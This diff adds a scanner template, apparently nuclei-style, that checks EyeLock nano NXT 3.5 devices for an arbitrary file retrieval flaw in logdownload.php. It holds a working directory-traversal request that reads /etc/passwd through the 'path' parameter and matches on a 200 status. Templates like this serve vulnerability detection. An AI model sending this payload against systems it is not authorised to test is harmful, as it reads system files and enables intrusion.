@@ -1,0 +1,19 @@
+id: eyelock-nano-lfd
+brief:
+    title: EyeLock nano NXT 3.5 - Arbitrary File Retrieval
+    by: geeknik
+    level: high
+    about: EyeLock nano NXT suffers from a file retrieval vulnerability when input passed through the 'path' parameter to 'logdownload.php' script is not properly verified before being used to read files. Thi...
+    label:
+        - iot
+        - lfi
+        - eyelock
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/scripts/logdownload.php?dlfilename=juicyinfo.txt&path=../../../../../../../../etc/passwd'
+      signs:
+        - "on": status
+          status:
+            - 200
